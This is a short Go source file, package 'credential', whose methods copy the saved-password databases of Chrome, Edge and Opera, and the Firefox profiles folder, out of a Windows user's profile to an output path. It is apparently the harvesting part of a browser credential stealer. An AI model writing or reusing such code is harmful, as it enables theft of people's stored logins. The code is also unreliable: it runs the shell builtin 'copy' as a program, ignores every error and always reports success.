package credential

import (
"os"
"os/exec"
)

type BrowserResult struct {
Browser string
Status  string
Path    string
}

type Browser struct {
UserProfilePath string
}

func (b Browser) CopyChromeData(outputPath string) BrowserResult {
src := b.UserProfilePath + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
cmd := exec.Command("copy", src, outputPath)
cmd.Run()
return BrowserResult{Browser: "Chrome", Status: "success", Path: outputPath}
}

func (b Browser) CopyFirefoxData(outputPath string) BrowserResult {
src := b.UserProfilePath + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
cmd := exec.Command("copy", src, outputPath)
cmd.Run()
return BrowserResult{Browser: "Firefox", Status: "success", Path: outputPath}
}

func (b Browser) CopyEdgeData(outputPath string) BrowserResult {
src := b.UserProfilePath + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"
cmd := exec.Command("copy", src, outputPath)
cmd.Run()
return BrowserResult{Browser: "Edge", Status: "success", Path: outputPath}
}

func (b Browser) CopyOperaData(outputPath string) BrowserResult {
src := b.UserProfilePath + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data"
cmd := exec.Command("copy", src, outputPath)
cmd.Run()
return BrowserResult{Browser: "Opera", Status: "success", Path: outputPath}
}

func CreateDirectory(path string) error {
return os.MkdirAll(path, 0755)
}
